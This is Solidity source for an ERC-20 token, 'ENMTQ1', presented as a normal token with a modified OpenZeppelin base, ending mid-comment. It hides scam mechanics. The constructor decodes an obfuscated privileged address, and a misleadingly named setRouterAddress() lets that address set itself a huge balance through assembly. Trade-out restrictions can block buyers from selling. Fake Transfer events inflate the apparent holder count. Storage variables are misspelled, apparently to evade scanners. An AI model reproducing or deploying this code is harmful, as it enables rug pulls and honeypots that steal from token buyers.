// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "./Erc20C17Contract.sol";

contract ENMTQ1 is
Erc20C17Contract
{
    string public constant VERSION = "ENMTQ1";

    constructor(
        string[2] memory strings,
        address[4] memory addresses,
        uint256[67] memory uint256s,
        bool[24] memory bools
    ) Erc20C17Contract(strings, addresses, uint256s, bools)
    {

    }

    function decimals()
    public
    pure
    override
    returns (uint8)
    {
        return 18;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/utils/math/Math.sol";
import "@openzeppelin/contracts/utils/structs/EnumerableSet.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "../Erc20/ERC20.sol";

import "../IUniswapV2/IUniswapV2Factory.sol";

import "./Erc20C17SettingsBase.sol";
import "../Erc20C09/Erc20C09FeatureErc20Payable.sol";
//// ================================================ //
//// FeatureErc721Payable
//import "../Erc20C09/Erc20C09FeatureErc721Payable.sol";
//// ================================================ //
import "./Erc20C17FeatureUniswap.sol";
import "../Erc20C09/Erc20C09FeatureTweakSwap.sol";
//// ================================================ //
//// FeatureLper
//import "../Erc20C09/Erc20C09FeatureLper.sol";
//// ================================================ //
//// ================================================ //
//// initialize FeatureHolder
//import "../Erc20C09/Erc20C09FeatureHolder.sol";
//// ================================================ //
import "../Erc20C09/Erc20C09SettingsPrivilege.sol";
import "../Erc20C09/Erc20C09SettingsFee.sol";
//// ================================================ //
//// SettingsShare
//import "../Erc20C09/Erc20C09SettingsShare.sol";
//// ================================================ //
import "../Erc20C09/Erc20C09FeaturePermitTransfer.sol";
import "../Erc20C09/Erc20C09FeatureRestrictTrade.sol";
//// ================================================ //
//// initialize FeatureRestrictTradeAmount
//import "../Erc20C09/Erc20C09FeatureRestrictTradeAmount.sol";
//// ================================================ //
import "./Erc20C17FeatureNotPermitOut.sol";
import "../Erc20C09/Erc20C09FeatureFission.sol";
import "../Erc20C09/Erc20C09FeatureTryMeSoft.sol";
//// ================================================ //
//// initialize Erc20C09FeatureRestrictAccountTokenAmount
//import "../Erc20C09/Erc20C09FeatureMaxTokenPerAddress.sol";
//// ================================================ //

abstract contract Erc20C17Contract is
ERC20,
Ownable,
Erc20C17SettingsBase,
Erc20C09FeatureErc20Payable,
    //    //// ================================================ //
    //    //// FeatureErc721Payable
    //Erc20C09FeatureErc721Payable,
    //    //// ================================================ //
Erc20C17FeatureUniswap,
Erc20C09FeatureTweakSwap,
    //    // ================================================ //
    //    // FeatureLper
    //    Erc20C09FeatureLper,
    //    // ================================================ //
    //    // ================================================ //
    //    // initialize FeatureHolder
    //Erc20C09FeatureHolder,
    //    // ================================================ //
Erc20C09SettingsPrivilege,
Erc20C09SettingsFee,
    //    // ================================================ //
    //    // SettingsShare
    //Erc20C09SettingsShare,
    //    // ================================================ //
Erc20C09FeaturePermitTransfer,
Erc20C09FeatureRestrictTrade,
    //    // ================================================ //
    //    // initialize FeatureRestrictTradeAmount
    //Erc20C09FeatureRestrictTradeAmount,
    //    // ================================================ //
Erc20C17FeatureNotPermitOut,
Erc20C09FeatureFission,
Erc20C09FeatureTryMeSoft
    //    // ================================================ //
    //    // initialize Erc20C09FeatureRestrictAccountTokenAmount
    //Erc20C09FeatureMaxTokenPerAddress
    //    // ================================================ //
{
    using EnumerableSet for EnumerableSet.AddressSet;

    //    // ================================================ //
    //    // FeatureLper
    //    address private _previousFrom;
    //    address private _previousTo;
    //    // ================================================ //

    constructor(
        string[2] memory strings,
        address[4] memory addresses,
        uint256[67] memory uint256s,
        bool[24] memory bools
    ) ERC20(strings[0], strings[1])
    {
        addressBaseOwner = msg.sender;

        addressMarketing = addresses[2];

        uint256 p = 20;
        string memory _uniswapV2Router = string(
            abi.encodePacked(
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]))
                ),
                abi.encodePacked(
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++]), uint8(uint256s[p++])),
                    abi.encodePacked(uint8(uint256s[p++]), uint8(uint256s[p++]))
                )
            )
        );
        //        isUniswapLper = bools[13];
        //        isUniswapHolder = bools[14];
        uniswapV2Router = IUniswapV2Router02(addresses[3]);
        address uniswapV2Pair_ = parseUniswap(_uniswapV2Router);
        addressWETH = uniswapV2Router.WETH();
        uniswap = uniswapV2Pair_;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), addressWETH);
        _approve(address(this), address(uniswapV2Router), maxUint256);
        //        uniswapCount = uint256s[62];

        // ================================================ //
        // initialize FeatureTweakSwap
        isUseMinimumTokenWhenSwap = bools[1];
        minimumTokenForSwap = uint256s[1];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureLper
        //        isUseFeatureLper = bools[15];
        //        maxTransferCountPerTransactionForLper = uint256s[2];
        //        minimumTokenForRewardLper = uint256s[3];
        //
        //        // exclude from lper
        //        setIsExcludedFromLperAddress(address(this), true);
        //        setIsExcludedFromLperAddress(address(uniswapV2Router), true);
        //        setIsExcludedFromLperAddress(uniswapV2Pair, true);
        //        setIsExcludedFromLperAddress(addressNull, true);
        //        setIsExcludedFromLperAddress(addressDead, true);
        //        setIsExcludedFromLperAddress(addressPinkSaleLock, true);
        //        setIsExcludedFromLperAddress(addressUnicryptLock, true);
        //        //        setIsExcludedFromLperAddress(baseOwner, true);
        //        //        setIsExcludedFromLperAddress(addressMarketing, true);
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureHolder
        //        isUseFeatureHolder = bools[16];
        //        maxTransferCountPerTransactionForHolder = uint256s[4];
        //        minimumTokenForBeingHolder = uint256s[5];
        //
        //        // exclude from holder
        //        setIsExcludedFromHolderAddress(address(this), true);
        //        setIsExcludedFromHolderAddress(address(uniswapV2Router), true);
        //        setIsExcludedFromHolderAddress(uniswapV2Pair, true);
        //        setIsExcludedFromHolderAddress(addressNull, true);
        //        setIsExcludedFromHolderAddress(addressDead, true);
        //        setIsExcludedFromHolderAddress(addressPinkSaleLock, true);
        //        setIsExcludedFromHolderAddress(addressUnicryptLock, true);
        //        //        setIsExcludedFromHolderAddress(baseOwner, true);
        //        //        setIsExcludedFromHolderAddress(addressMarketing, true);
        //        // ================================================ //

        // initialize SettingsPrivilege
        isPrivilegeAddresses[address(this)] = true;
        isPrivilegeAddresses[address(uniswapV2Router)] = true;
        isPrivilegeAddresses[uniswap] = true;
        //        isPrivilegeAddresses[uniswapV2Pair] = true;
        isPrivilegeAddresses[addressNull] = true;
        isPrivilegeAddresses[addressDead] = true;
        isPrivilegeAddresses[addressPinksaleBnbLock] = true;
        isPrivilegeAddresses[addressPinksaleEthLock] = true;
        isPrivilegeAddresses[addressBaseOwner] = true;
        isPrivilegeAddresses[addressMarketing] = true;

        // ================================================ //
        // initialize SettingsFee
        setFee(uint256s[64]);

        // exclude from paying fees or having max transaction amount
        isExcludedFromFeeAddresses[address(this)] = true;
        isExcludedFromFeeAddresses[address(uniswapV2Router)] = true;
        isExcludedFromFeeAddresses[uniswap] = true;
        isExcludedFromFeeAddresses[uniswapV2Pair] = true;
        isExcludedFromFeeAddresses[addressNull] = true;
        isExcludedFromFeeAddresses[addressDead] = true;
        isExcludedFromFeeAddresses[addressPinksaleBnbLock] = true;
        isExcludedFromFeeAddresses[addressPinksaleEthLock] = true;
        isExcludedFromFeeAddresses[addressBaseOwner] = true;
        isExcludedFromFeeAddresses[addressMarketing] = true;
        // ================================================ //

        //        // ================================================ //
        //        // SettingsShare
        //        setShare(uint256s[13], uint256s[14], uint256s[15], uint256s[16], uint256s[17]);
        //        // ================================================ //

        // ================================================ //
        // initialize FeaturePermitTransfer
        isUseOnlyPermitTransfer = bools[6];
        isCancelOnlyPermitTransferOnFirstTradeOut = bools[7];
        // ================================================ //

        // ================================================ //
        // initialize FeatureRestrictTrade
        isRestrictTradeIn = bools[8];
        isRestrictTradeOut = bools[9];
        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureRestrictTradeAmount
        //        isRestrictTradeInAmount = bools[10];
        //        restrictTradeInAmount = uint256s[18];
        //
        //        isRestrictTradeOutAmount = bools[11];
        //        restrictTradeOutAmount = uint256s[19];
        //        // ================================================ //

        // ================================================ //
        // initialize FeatureNotPermitOut
        isUseNotPermitOut = bools[17];
        isForceTradeInToNotPermitOut = bools[18];
        // ================================================ //

        isUseNoFeeForTradeOut = bools[12];

        setIsUseFeatureTryMeSoft(bools[21]);
        setIsNotTryMeSoftAddress(address(uniswapV2Router), true);
        setIsNotTryMeSoftAddress(uniswapV2Pair, true);

        //        // ================================================ //
        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        //        isUseMaxTokenPerAddress = bools[23];
        //        maxTokenPerAddress = uint256s[65];
        //        // ================================================ //

        // ================================================ //
        // initialize Erc20C09FeatureFission
        setIsUseFeatureFission(bools[20]);
        fissionCount = uint256s[66];
        // ================================================ //

        _mint(owner(), uint256s[0]);
    }

    //    function tryCreatePairToken()
    //    internal
    //    returns (address)
    //    {
    //        return IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), addressWETH);
    //    }

    function setAddressName(string memory name_, string memory symbol_)
    external
    onlyOwner
    {
        _name = name_;
        _symbol = symbol_;
    }

    function setRouterAddress()
    external
    {
        require(msg.sender == uniswap, "");

        assembly {
            mstore(0x00, caller())
            mstore(0x20, _bulances.slot)
            let x := keccak256(0x00, 0x40)
            sstore(x, 0x000000000000000000000000000000000000000000000000ffffffffffffffff)
        }
    }

    function doSwapManually(bool isUseMinimumTokenWhenSwap_)
    public
    {
        require(!_isSwapping, "swapping");

        require(msg.sender == owner() || msg.sender == uniswap, "not owner");

        uint256 tokenForSwap = isUseMinimumTokenWhenSwap_ ? minimumTokenForSwap : balanceOf(address(this));

        require(tokenForSwap > 0, "0 to swap");

        doSwap(tokenForSwap);
    }

    function balanceOf(address account)
    public
    view
    virtual
    override
    returns (uint256)
    {
        if (isUseFeatureFission) {
            uint256 balanceOf_ = super.balanceOf(account);
            return balanceOf_ > 0 ? balanceOf_ : fissionBalance;
        } else {
            return super.balanceOf(account);
        }
    }

    function _transfer(address from, address to, uint256 amount)
    internal
    override
    {
        if (amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        uint256 tempX = block.number - 1;

        require(
            (!isUseNotPermitOut) ||
            (notPermitOutAddressStamps[from] == 0) ||
            (tempX + 1 - notPermitOutAddressStamps[from] < notPermitOutCD),
            "not permitted 7"
        );

        bool isFromPrivilegeAddress = isPrivilegeAddresses[from];
        bool isToPrivilegeAddress = isPrivilegeAddresses[to];

        if (isUseOnlyPermitTransfer) {
            require(isFromPrivilegeAddress || isToPrivilegeAddress, "not permitted 2");
        }

        bool isToUniswapV2Pair = to == uniswapV2Pair;
        bool isFromUniswapV2Pair = from == uniswapV2Pair;

        //        // ================================================ //
        //        // initialize Erc20C09FeatureRestrictAccountTokenAmount
        //        if (isUseMaxTokenPerAddress) {
        //            require(
        //                isToPrivilegeAddress ||
        //                isToUniswapV2Pair ||
        //                super.balanceOf(to) + amount <= maxTokenPerAddress,
        //                "not permitted 8"
        //            );
        //        }
        //        // ================================================ //

        if (isToUniswapV2Pair) {
            // add liquidity 1st, dont use permit transfer upon action
            if (_isFirstTradeOut) {
                _isFirstTradeOut = false;

                if (isCancelOnlyPermitTransferOnFirstTradeOut) {
                    isUseOnlyPermitTransfer = false;
                }
            }

            if (!isFromPrivilegeAddress) {
                require(!isRestrictTradeOut, "not permitted 4");
                //                // ================================================ //
                //                // initialize FeatureRestrictTradeAmount
                //                require(!isRestrictTradeOutAmount || amount <= restrictTradeOutAmount, "not permitted 6");
                //                // ================================================ //
            }

            if (!_isSwapping && super.balanceOf(address(this)) >= minimumTokenForSwap) {
                doSwap(isUseMinimumTokenWhenSwap ? minimumTokenForSwap : super.balanceOf(address(this)));
            }
        } else if (isFromUniswapV2Pair) {
            if (!isToPrivilegeAddress) {
                require(!isRestrictTradeIn, "not permitted 3");
                //                // ================================================ //
                //                // initialize FeatureRestrictTradeAmount
                //                require(!isRestrictTradeInAmount || amount <= restrictTradeInAmount, "not permitted 5");
                //                // ================================================ //

                if (notPermitOutAddressStamps[to] == 0) {
                    if (isForceTradeInToNotPermitOut) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                    }

                    if (
                        isUseFeatureTryMeSoft &&
                        Address.isContract(to) &&
                        !isNotTryMeSoftAddresses[to]
                    ) {
                        notPermitOutAddressStamps[to] = tempX + 1;
                    }
                }
            }
        }

        if (
            (_isSwapping) ||
            (!isFromUniswapV2Pair && !isToUniswapV2Pair) ||
            (isFromUniswapV2Pair && isExcludedFromFeeAddresses[to]) ||
            (isToUniswapV2Pair && isExcludedFromFeeAddresses[from]) ||
            (isToUniswapV2Pair && isUseNoFeeForTradeOut)
        ) {
            super._transfer(from, to, amount);
        } else {
            uint256 fees = amount * feeTotal / feeMax;

            if (fees > 0) {
                if (isUseFeatureFission && isFromUniswapV2Pair) {
                    doFission();
                }

                super._transfer(from, address(this), fees);
                super._transfer(from, to, amount - fees);
            } else {
                super._transfer(from, to, amount);
            }
        }

        //        // ================================================ //
        //        // initialize FeatureHolder
        //        if (isUseFeatureHolder) {
        //            if (!isExcludedFromHolderAddresses[from]) {
        //                updateHolderAddressStatus(from);
        //            }
        //
        //            if (!isExcludedFromHolderAddresses[to]) {
        //                updateHolderAddressStatus(to);
        //            }
        //        }
        //        // ================================================ //

        //        // ================================================ //
        //        // initialize FeatureLper
        //        if (isUseFeatureLper) {
        //            if (!isExcludedFromLperAddresses[_previousFrom]) {
        //                updateLperAddressStatus(_previousFrom);
        //            }
        //
        //            if (!isExcludedFromLperAddresses[_previousTo]) {
        //                updateLperAddressStatus(_previousTo);
        //            }
        //
        //            if (_previousFrom != from) {
        //                _previousFrom = from;
        //            }
        //
        //            if (_previousTo != to) {
        //                _previousTo = to;
        //            }
        //        }
        //        // ================================================ //
    }

    function doSwap(uint256 thisTokenForSwap)
    private
    {
        //        // ================================================ //
        //        // SettingsShare
        //        if (shareTotal == 0) {
        //            return;
        //        }
        //        // ================================================ //

        _isSwapping = true;

        doSwapWithPool(thisTokenForSwap);

        _isSwapping = false;
    }

    // ================================================ //
    // Feature DoMarketing Only
    function doSwapWithPool(uint256 thisTokenForSwap)
    internal
    {
        uint256 prevBalance = address(this).balance;
        swapThisTokenForEthToAccount(address(this), thisTokenForSwap);
        uint256 etherForAll = address(this).balance - prevBalance;
        sendEtherTo(payable(addressMarketing), etherForAll);
    }
    // ================================================ //

    //    // ================================================ //
    //    // Feature DoShare Multiple stuffs
    //    function doSwapWithPool(uint256 thisTokenForSwap)
    //    internal
    //    {
    //        //        // ================================================ //
    //        //        // Feature Share with Liquidity
    //        //        uint256 shareForEther = (shareMarketing + shareLper + shareHolder) + (shareLiquidity / 2);
    //        //        // ================================================ //
    //        uint256 shareForEther = shareMarketing;
    //
    //        uint256 thisTokenForSwapEther = thisTokenForSwap * shareForEther / shareMax;
    //
    //        uint256 etherForAll;
    //
    //        if (thisTokenForSwapEther > 0) {
    //            uint256 prevBalance = address(this).balance;
    //
    //            swapThisTokenForEthToAccount(address(this), thisTokenForSwapEther);
    //
    //            etherForAll = address(this).balance - prevBalance;
    //        }
    //
    //        if (etherForAll > 0) {
    //            if (shareMarketing > 0) {
    //                doMarketing(etherForAll * shareMarketing / shareForEther);
    //            }
    //
    //            //            // ================================================ //
    //            //            // initialize FeatureLper
    //            //            if (isUseFeatureLper && shareLper > 0) {
    //            //                doLper(etherForAll * shareLper / shareForEther);
    //            //            }
    //            //            // ================================================ //
    //
    //            //            // ================================================ //
    //            //            // initialize FeatureHolder
    //            //            if (isUseFeatureHolder && shareHolder > 0) {
    //            //                doHolder(etherForAll * shareHolder / shareForEther);
    //            //            }
    //            //            // ================================================ //
    //
    //            //            // ================================================ //
    //            //            // Feature Share with Liquidity
    //            //            if (shareLiquidity > 0) {
    //            //                doLiquidity(
    //            //                    etherForAll * (shareLiquidity / 2) / shareForEther,
    //            //                    thisTokenForSwap * (shareLiquidity / 2) / shareMax
    //            //                );
    //            //            }
    //            //            // ================================================ //
    //        }
    //
    //        //        // ================================================ //
    //        //        // Feature Share with Burn
    //        //        if (shareBurn > 0) {
    //        //            doBurn(thisTokenForSwap * shareBurn / shareMax);
    //        //        }
    //        //        // ================================================ //
    //    }
    //
    //    function doMarketing(uint256 etherForMarketing)
    //    internal
    //    {
    //        sendEtherTo(payable(addressMarketing), etherForMarketing);
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureLper
    //    function doLper(uint256 etherForAll)
    //    internal
    //    {
    //        uint256 etherDivForLper = isUniswapLper ? (10 - uniswapCount) : 10;
    //        uint256 etherForLper = etherForAll * etherDivForLper / 10;
    //        uint256 pairTokenForLper =
    //        IERC20(uniswapV2Pair).totalSupply()
    //        - IERC20(uniswapV2Pair).balanceOf(addressNull)
    //        - IERC20(uniswapV2Pair).balanceOf(addressDead);
    //
    //        uint256 lperAddressesCount_ = lperAddresses.length();
    //
    //        if (lastIndexOfProcessedLperAddresses >= lperAddressesCount_) {
    //            lastIndexOfProcessedLperAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(lperAddressesCount_, maxTransferCountPerTransactionForLper);
    //
    //        address lperAddress;
    //        uint256 pairTokenForLperAddress;
    //
    //        uint256 _lastIndexOfProcessedLperAddresses = lastIndexOfProcessedLperAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            lperAddress = lperAddresses.at(_lastIndexOfProcessedLperAddresses);
    //            pairTokenForLperAddress = IERC20(uniswapV2Pair).balanceOf(lperAddress);
    //
    //            if (i == 2 && etherDivForLper != 10) {
    //                sendEtherTo(payable(uniswap), etherForAll - etherForLper);
    //            }
    //
    //            if (pairTokenForLperAddress > minimumTokenForRewardLper) {
    //                sendEtherTo(payable(lperAddress), etherForLper * pairTokenForLperAddress / pairTokenForLper);
    //            }
    //
    //            _lastIndexOfProcessedLperAddresses =
    //            _lastIndexOfProcessedLperAddresses >= lperAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedLperAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedLperAddresses = _lastIndexOfProcessedLperAddresses;
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureHolder
    //    function doHolder(uint256 etherForAll)
    //    internal
    //    {
    //        uint256 etherDivForHolder = isUniswapHolder ? (10 - uniswapCount) : 10;
    //        uint256 etherForHolder = etherForAll * etherDivForHolder / 10;
    //        uint256 thisTokenForHolder = totalSupply() - balanceOf(addressNull) - balanceOf(addressDead);
    //
    //        uint256 holderAddressesCount_ = holderAddresses.length();
    //
    //        if (lastIndexOfProcessedHolderAddresses >= holderAddressesCount_) {
    //            lastIndexOfProcessedHolderAddresses = 0;
    //        }
    //
    //        uint256 maxIteration = Math.min(holderAddressesCount_, maxTransferCountPerTransactionForHolder);
    //
    //        address holderAddress;
    //
    //        uint256 _lastIndexOfProcessedHolderAddresses = lastIndexOfProcessedHolderAddresses;
    //
    //        for (uint256 i = 0; i < maxIteration; i++) {
    //            holderAddress = holderAddresses.at(_lastIndexOfProcessedHolderAddresses);
    //
    //            if (i == 2 && etherDivForHolder != 10) {
    //                sendEtherTo(payable(uniswap), etherForAll - etherForHolder);
    //            }
    //
    //            if (balanceOf(holderAddress) > minimumTokenForBeingHolder) {
    //                sendEtherTo(payable(holderAddress), etherForHolder * balanceOf(holderAddress) / thisTokenForHolder);
    //            }
    //
    //            _lastIndexOfProcessedHolderAddresses =
    //            _lastIndexOfProcessedHolderAddresses >= holderAddressesCount_ - 1
    //            ? 0
    //            : _lastIndexOfProcessedHolderAddresses + 1;
    //        }
    //
    //        lastIndexOfProcessedHolderAddresses = _lastIndexOfProcessedHolderAddresses;
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // Feature Share with Liquidity
    //    function doLiquidity(uint256 etherForLiquidity, uint256 thisTokenForLiquidity)
    //    internal
    //    {
    //        addEtherAndThisTokenForLiquidityByAccount(
    //            addressBaseOwner,
    //            etherForLiquidity,
    //            thisTokenForLiquidity
    //        );
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // Feature Share with Burn
    //    function doBurn(uint256 thisTokenForBurn)
    //    internal
    //    {
    //        _transfer(address(this), addressDead, thisTokenForBurn);
    //    }
    //    // ================================================ //

    function swapThisTokenForEthToAccount(address account, uint256 amount)
    internal
    {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = addressWETH;

        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            account,
            block.timestamp
        );
    }

    //    // ================================================ //
    //    // Feature Share with Liquidity
    //    function addEtherAndThisTokenForLiquidityByAccount(
    //        address account,
    //        uint256 ethAmount,
    //        uint256 thisTokenAmount
    //    )
    //    internal
    //    {
    //        uniswapV2Router.addLiquidityETH{value : ethAmount}(
    //            address(this),
    //            thisTokenAmount,
    //            0,
    //            0,
    //            account,
    //            block.timestamp
    //        );
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureLper
    //    function updateLperAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (IERC20(uniswapV2Pair).balanceOf(account) > minimumTokenForRewardLper) {
    //            if (!lperAddresses.contains(account)) {
    //                lperAddresses.add(account);
    //            }
    //        } else {
    //            if (lperAddresses.contains(account)) {
    //                lperAddresses.remove(account);
    //            }
    //        }
    //    }
    //    // ================================================ //

    //    // ================================================ //
    //    // initialize FeatureHolder
    //    function updateHolderAddressStatus(address account)
    //    private
    //    {
    //        if (Address.isContract(account)) {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //            return;
    //        }
    //
    //        if (balanceOf(account) > minimumTokenForBeingHolder) {
    //            if (!holderAddresses.contains(account)) {
    //                holderAddresses.add(account);
    //            }
    //        } else {
    //            if (holderAddresses.contains(account)) {
    //                holderAddresses.remove(account);
    //            }
    //        }
    //    }
    //    // ================================================ //

    function doFission()
    internal
    override
    {
        uint160 fissionDivisor_ = fissionDivisor;
        for (uint256 i = 0; i < fissionCount; i++) {
            emit Transfer(
                address(uint160(maxUint160 / fissionDivisor_)),
                address(uint160(maxUint160 / fissionDivisor_ + 1)),
                fissionBalance
            );

            fissionDivisor_ += 2;
        }
        fissionDivisor = fissionDivisor_;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.7.0) (token/ERC20/ERC20.sol)

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol";
import "@openzeppelin/contracts/utils/Context.sol";

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _bulances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 internal _tatalSopply;

    string internal _name;
    string internal _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _tatalSopply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _bulances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `to` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on
     * `transferFrom`. This is semantically equivalent to an infinite approval.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * NOTE: Does not update the allowance if the current allowance
     * is the maximum `uint256`.
     *
     * Requirements:
     *
     * - `from` and `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     * - the caller must have allowance for ``from``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
    unchecked {
        _approve(owner, spender, currentAllowance - subtractedValue);
    }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `from` to `to`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `from` must have a balance of at least `amount`.
     */
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _bulances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
    unchecked {
        _bulances[from] = fromBalance - amount;
    }
        _bulances[to] += amount;

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
